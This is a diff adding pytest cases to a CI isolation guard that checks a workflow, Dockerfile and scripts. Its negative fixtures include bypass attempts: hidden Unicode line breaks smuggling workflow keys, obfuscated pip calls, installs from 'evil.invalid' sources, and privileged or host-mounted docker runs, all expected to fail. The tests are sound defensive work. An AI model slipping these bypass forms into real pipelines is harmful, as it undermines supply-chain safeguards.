@@ -19,6 +19,7 @@ REPO_ROOT = Path(__file__).resolve().parent.parent
 WORKFLOW = REPO_ROOT / ".github" / "workflows" / "ci.yml"
 DOCKERFILE = REPO_ROOT / "ci" / "isolated-tests" / "Dockerfile"
 RUNNER = REPO_ROOT / "scripts" / "run_isolated_tests.sh"
+RED_CHECKS = REPO_ROOT / "scripts" / "check_isolation_red.sh"
 BOOTSTRAP = REPO_ROOT / "scripts" / "bootstrap_locked_pip.sh"
 CHECKOUT_SHA = "11d5960a326750d5838078e36cf38b85af677262"
 
@@ -99,8 +100,24 @@ def test_reviewed_shell_forms_pass(command: str) -> None:
     assert guard.check_shell(command, "fixture") == []
 
 
-def test_bootstrap_script_passes() -> None:
-    assert guard.check_shell(BOOTSTRAP.read_text(encoding="utf-8"), "bootstrap") == []
+@pytest.mark.parametrize("path", [BOOTSTRAP, RED_CHECKS, RUNNER], ids=lambda p: p.name)
+def test_reviewed_scripts_pass_the_shell_analysis(path: Path) -> None:
+    assert guard.check_shell(path.read_text(encoding="utf-8"), path.name) == []
+
+
+def test_reviewed_file_digests_match() -> None:
+    import hashlib
+
+    for name, digest in guard.REVIEWED_FILES.items():
+        assert hashlib.sha256((REPO_ROOT / name).read_bytes()).hexdigest() == digest, name
+
+
+def test_every_reviewed_run_line_is_used() -> None:
+    # The allowlist must not keep lines the workflow no longer runs.
+    doc = guard.parse_yaml(WF)
+    used = {line for job in doc["jobs"].values() for step in job["steps"] if "run" in step
+            for line in step["run"].text.split("\n") if line}
+    assert used == guard.REVIEWED_RUN_LINES
 
 
 # --- NEG-07: persist-credentials --------------------------------------------------------
@@ -287,7 +304,7 @@ def test_neg10_second_docker_run_fails() -> None:
         ("persist-credentials: false", "persist-credentials: !!bool false",
          "YAML_UNSUPPORTED_SCALAR"),
         ("persist-credentials: false", "persist-credentials: 'false'", "YAML_UNSUPPORTED_SCALAR"),
-        ("persist-credentials: false", "\tpersist-credentials: false", "YAML_TAB"),
+        ("persist-credentials: false", "\tpersist-credentials: false", "UNSUPPORTED_CHARACTER"),
         ("name: CI\n", "---\nname: CI\n", "YAML_DOCUMENT"),
         ('python-version: "3.9.25"', 'python-version: "3.9.2\\x35"', "YAML_UNSUPPORTED_SCALAR"),
         ("run: bash scripts/run_isolated_tests.sh\n", "run: >\n          bash x\n",
@@ -295,7 +312,7 @@ def test_neg10_second_docker_run_fails() -> None:
         ("    steps:\n      - uses:", "    steps:\n    - uses:", "YAML_INDENT"),
         ("persist-credentials: false", "persist-credentials:\n            false",
          "YAML_UNSUPPORTED_KEY"),
-        ("name: CI\n", "name: CI\r\n", "YAML_ENCODING"),
+        ("name: CI\n", "name: CI\r\n", "UNSUPPORTED_CHARACTER"),
     ],
 )
 def test_neg12_unsupported_or_ambiguous_yaml_fails(old: str, new: str, code: str) -> None:
@@ -386,7 +403,7 @@ def test_neg12_weakened_workflow_structure_fails(old: str, new: str, code: str) 
         ("uv pip install requests", "FORBIDDEN_INSTALLER"),
         ("python -m ensurepip --upgrade", "FORBIDDEN_INSTALLER"),
         ("$(which pip) install requests", "UNRECOGNIZED_PIP_INVOCATION"),
-        ("$PIP install requests", "UNRECOGNIZED_PIP_INVOCATION"),
+        ("$PIP install requests", "SHELL_DYNAMIC"),
         ("env -i pip install requests", "UNRECOGNIZED_PIP_INVOCATION"),
         ('pip install "requests', "SHELL_UNPARSABLE"),
         ("pip", "PIP_NO_COMMAND"),
@@ -452,3 +469,187 @@ def test_unlocked_install_in_any_script_fails(tmp_path: Path) -> None:
     (root / "scripts" / "extra.sh").write_text("#!/bin/sh\npip install requests\n",
                                                encoding="utf-8")
     assert "PIP_UNLOCKED_REQUIREMENT" in codes(guard.check_repository(root))
+
+
+# --- independent audit (Phase 3H-R3) findings ---------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "separator", ["\u2028", "\u2029", "\x85", "\x0b", "\x0c", "\x00", "\u202e", "\ufeff", "\u00e9"]
+)
+def test_audit_d1_hidden_line_breaks_and_non_ascii_in_workflow_fail(separator: str) -> None:
+    # A YAML 1.1 parser treats NEL/U+2028/U+2029 as line breaks: the hidden key
+    # after the comment would be real to GitHub but invisible to the subset parser.
+    text = mutate(WF, "        run: python3 -I scripts/check_no_persisted_credentials.py\n",
+                  "        run: python3 -I scripts/check_no_persisted_credentials.py # note"
+                  f"{separator}        continue-on-error: true\n")
+    assert check_wf(text) == {"UNSUPPORTED_CHARACTER"}
+
+
+@pytest.mark.parametrize("separator", ["\u2028", "\x85", "\x0b"])
+def test_audit_d1_hidden_line_breaks_in_dockerfile_and_scripts_fail(separator: str) -> None:
+    assert "UNSUPPORTED_CHARACTER" in codes(guard.check_dockerfile(DF + f"#{separator}x\n"))
+    assert "UNSUPPORTED_CHARACTER" in codes(guard.check_runner(RN + f"#{separator}x\n"))
+    assert "UNSUPPORTED_CHARACTER" in codes(guard.check_shell(f"echo{separator}x", "fixture"))
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        'bash -c "pip install requests"',
+        "sh -c 'pip install requests'",
+        "bash -ec 'echo hi'",
+        'eval "pip install requests"',
+        "source ./x.sh",
+        ". ./x.sh",
+        "alias p=pip",
+        "python -c 'import runpy'",
+        "python3 -Ic 'import runpy'",
+        "p=pi; python -m ${p}p install x",
+        "python -m $(echo cGlw | base64 -d) install x",
+        'python "$X" install x',
+        '"$P" install requests',
+        "echo ok >> \"$GITHUB_ENV\"",
+    ],
+)
+def test_audit_d2_dynamic_shell_in_a_workflow_run_fails(line: str) -> None:
+    text = mutate(WF, "          python -m pip check\n",
+                  f"          python -m pip check\n          {line}\n")
+    assert "RUN_NOT_REVIEWED" in check_wf(text)
+
+
+@pytest.mark.parametrize(
+    "command,code",
+    [
+        ('bash -c "pip install requests"', "SHELL_DYNAMIC"),
+        ("sh -c 'pip install requests'", "SHELL_DYNAMIC"),
+        ('eval "pip install requests"', "SHELL_DYNAMIC"),
+        ("python -c 'import runpy'", "SHELL_DYNAMIC"),
+        ("python3 -Ic 'import runpy'", "SHELL_DYNAMIC"),
+        ("p=pi; python -m ${p}p install x", "SHELL_DYNAMIC"),
+        ("python -m $(echo cGlw | base64 -d) install x", "SHELL_DYNAMIC"),
+        ('python "$X" install x', "SHELL_DYNAMIC"),
+        ("source ./x.sh", "SHELL_DYNAMIC"),
+        # shlex alone would read `#` inside a word as a comment; bash does not.
+        ("echo ok#; pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
+        # A function body is analysed like any other command.
+        ('p() { pip "$@"; }', "PIP_FORBIDDEN_COMMAND"),
+        ("if true; then pip install requests; fi", "PIP_UNLOCKED_REQUIREMENT"),
+        ("! pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
+        # Command substitutions and trap handlers are analysed too.
+        ('X="$(pip install requests)"', "PIP_UNLOCKED_REQUIREMENT"),
+        ("X=`pip install requests`", "PIP_UNLOCKED_REQUIREMENT"),
+        ("trap 'pip install requests' EXIT", "PIP_UNLOCKED_REQUIREMENT"),
+    ],
+)
+def test_audit_d2_dynamic_or_hidden_shell_fails(command: str, code: str) -> None:
+    assert code in codes(guard.check_shell(command, "fixture"))
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo a#b",  # not a comment, and no pip
+        'echo "# not a comment"; true',
+        "python -m pip install --no-deps --no-build-isolation --no-index -e . 2>&1",  # D-10
+        "docker info >/dev/null 2>&1",
+        'case "$x" in "pip "*) echo ok ;; esac',
+    ],
+)
+def test_audit_shell_forms_that_must_still_pass(command: str) -> None:
+    assert guard.check_shell(command, "fixture") == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'X=git+https://evil.invalid/x; pip install --no-deps --no-build-isolation --no-index '
+        '-e "$X"',
+        "pip install --no-deps --no-build-isolation --no-index -e ${X}",
+        "pip install --require-hashes --no-deps --only-binary=:all: -r $LOCK",
+        "pip install --no-deps --no-build-isolation --no-index --find-links $W -e .",
+        "pip install --no-deps --no-build-isolation --no-index -e git+file:///tmp/x",
+    ],
+)
+def test_audit_d3_expanded_or_vcs_sources_fail(command: str) -> None:
+    assert "PIP_REMOTE_SOURCE" in codes(guard.check_shell(command, "fixture"))
+
+
+@pytest.mark.parametrize(
+    "old,new,code",
+    [
+        ("# Layer B (Phase 3H-R1)", "# syntax=docker.io/evil/frontend:latest\n# Layer B",
+         "DOCKERFILE_DIRECTIVE"),
+        ("# Layer B (Phase 3H-R1)", "# escape=`\n# Layer B", "DOCKERFILE_DIRECTIVE"),
+        ("COPY . /work", "COPY --from=docker.io/library/busybox:latest / /work",
+         "DOCKERFILE_FLAG"),
+        ("RUN apt-get update", "RUN --mount=type=bind,from=evil/image:latest apt-get update",
+         "DOCKERFILE_FLAG"),
+        ("RUN apt-get update", "RUN --network=host apt-get update", "DOCKERFILE_FLAG"),
+        ("WORKDIR /app\n", 'WORKDIR /app\nRUN ["pip", "install", "requests"]\n',
+         "DOCKERFILE_EXEC_FORM"),
+        ("    PIP_DISABLE_PIP_VERSION_CHECK=1", "    PIP_EXTRA_INDEX_URL=https://evil.invalid",
+         "DOCKERFILE_ENV"),
+        ("USER 10001:10001", "USER root", "DOCKERFILE_USER"),
+        ("USER 10001:10001\n", "", "DOCKERFILE_USER"),
+        ("USER 10001:10001\n", "USER 10001:10001\nRUN true\n", "DOCKERFILE_USER"),
+    ],
+)
+def test_audit_d4_dockerfile_bypasses_fail(old: str, new: str, code: str) -> None:
+    assert code in codes(guard.check_dockerfile(mutate(DF, old, new)))
+
+
+@pytest.mark.parametrize(
+    "prefix,code",
+    [
+        ("docker container run --network host -v /:/host \"$IMAGE\" sh; exit\n", "LAYER_B_DOCKER"),
+        ("VAR=1 docker run --privileged \"$IMAGE\" sh\n", "LAYER_B_RUN"),
+        ("echo x#; docker run --privileged \"$IMAGE\" sh\n", "LAYER_B_RUN"),
+        ("docker exec x sh\n", "LAYER_B_DOCKER"),
+    ],
+)
+def test_audit_d5_other_docker_invocations_fail(prefix: str, code: str) -> None:
+    text = mutate(RN, "# --- Execution: no network", prefix + "# --- Execution: no network")
+    assert code in codes(guard.check_runner(text))
+
+
+@pytest.mark.parametrize(
+    "old,new",
+    [
+        ("docker build --quiet", "docker build --network host --quiet"),
+        ("--platform linux/amd64", "--platform linux/arm64"),
+        ('-t "$IMAGE"', '-t "$IMAGE" --build-arg X=1'),
+    ],
+)
+def test_audit_d5_weakened_docker_build_fails(old: str, new: str) -> None:
+    assert "LAYER_B_BUILD" in codes(guard.check_runner(mutate(RN, old, new)))
+
+
+def test_audit_d8_step_before_checkout_fails() -> None:
+    text = mutate(WF, "    steps:\n      - uses: actions/checkout@",
+                  "    steps:\n      - name: x\n        run: python -m pip --version\n"
+                  "      - uses: actions/checkout@")
+    assert "CHECKOUT_NOT_FIRST" in check_wf(text)
+
+
+@pytest.mark.parametrize(
+    "relative,change",
+    [
+        ("scripts/run_isolated_tests.sh", "  --network none \\\n"),
+        ("scripts/check_isolation_red.sh", "true\n"),
+        ("scripts/bootstrap_locked_pip.sh", "true\n"),
+        ("scripts/check_no_persisted_credentials.py", "pass\n"),
+        ("ci/isolated-tests/Dockerfile", "# comment\n"),
+    ],
+)
+def test_reviewed_file_change_fails(tmp_path: Path, relative: str, change: str) -> None:
+    root = _repo_copy(tmp_path)
+    with (root / relative).open("a", encoding="utf-8") as handle:
+        handle.write(change)
+    assert "REVIEWED_FILE_CHANGED" in codes(guard.check_repository(root))
+
+
+def test_additional_script_fails(tmp_path: Path) -> None:
+    root = _repo_copy(tmp_path)
+    (root / "scripts" / "helper.sh").write_text("#!/bin/sh\necho hi\n", encoding="utf-8")
+    assert "SCRIPT_FILES" in codes(guard.check_repository(root))
